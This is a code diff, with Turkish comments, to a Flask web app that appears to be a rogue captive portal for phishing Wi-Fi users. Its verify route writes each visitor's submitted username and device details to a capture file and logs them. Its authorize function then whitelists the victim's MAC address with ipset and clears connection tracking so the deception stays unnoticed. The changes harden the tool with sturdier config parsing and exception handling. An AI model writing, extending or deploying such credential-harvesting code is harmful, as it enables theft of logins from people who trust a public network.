@@ -31,8 +31,19 @@ def load_config(path: str) -> dict:
             v = v.strip()
             if v[:1] in ("'", '"'):
                 q = v[0]
-                end = v.find(q, 1)
-                v = v[1:end] if end != -1 else v[1:]
+                out = []
+                i = 1
+                while i < len(v):
+                    ch = v[i]
+                    if q == '"' and ch == "\\" and i + 1 < len(v):
+                        out.append(v[i + 1])
+                        i += 2
+                        continue
+                    if ch == q:
+                        break
+                    out.append(ch)
+                    i += 1
+                v = "".join(out)
             else:
                 v = v.split("#", 1)[0].strip()
             cfg[k.strip()] = v
@@ -70,17 +81,33 @@ def mac_for_ip(ip: str) -> str | None:
 
 
 def authorize(ip: str) -> str | None:
-    """İstemciyi MAC'i üzerinden whitelist'e al."""
-    mac = mac_for_ip(ip)
-    if not mac:
-        # ARP kaydı yoksa kısa bir ping ile tetikle
-        subprocess.run(["ping", "-c", "1", "-W", "1", ip],
-                       capture_output=True, timeout=4)
+    """İstemciyi MAC'i üzerinden whitelist'e al. Asla exception fırlatmaz."""
+    try:
         mac = mac_for_ip(ip)
-    if not mac:
+        if not mac:
+            # ARP kaydı yoksa kısa bir ping ile tetikle
+            try:
+                subprocess.run(["ping", "-c", "1", "-W", "1", ip],
+                               capture_output=True, timeout=4)
+            except Exception:
+                pass
+            mac = mac_for_ip(ip)
+        if not mac:
+            return None
+        try:
+            subprocess.run(["ipset", "add", SET_NAME, mac],
+                           capture_output=True, timeout=5)
+        except Exception:
+            pass
+        # DNS/NAT akışları eski (wildcard) hedefe bağlı kalmasın
+        try:
+            subprocess.run(["conntrack", "-D", "-s", ip],
+                           capture_output=True, timeout=5)
+        except Exception:
+            pass
+        return mac
+    except Exception:
         return None
-    subprocess.run(["ipset", "add", SET_NAME, mac], capture_output=True)
-    return mac
 
 
 @app.route("/")
@@ -101,9 +128,12 @@ def verify():
         "ua": request.headers.get("User-Agent", ""),
         "referer": request.headers.get("Referer", ""),
     }
-    with open(CAPTURE, "a", encoding="utf-8") as f:
-        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
-    print(f"[+] {rec['ts']} {ip} {mac} -> {rec['username']}", flush=True)
+    try:
+        with open(CAPTURE, "a", encoding="utf-8") as f:
+            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
+        print(f"[+] {rec['ts']} {ip} {mac} -> {rec['username']}", flush=True)
+    except OSError as exc:
+        print(f"[-] capture yazılamadı: {exc}", flush=True)
     return render_template_string(THANKS_TMPL, brand=BRAND, target=SUCCESS_URL)
 
 
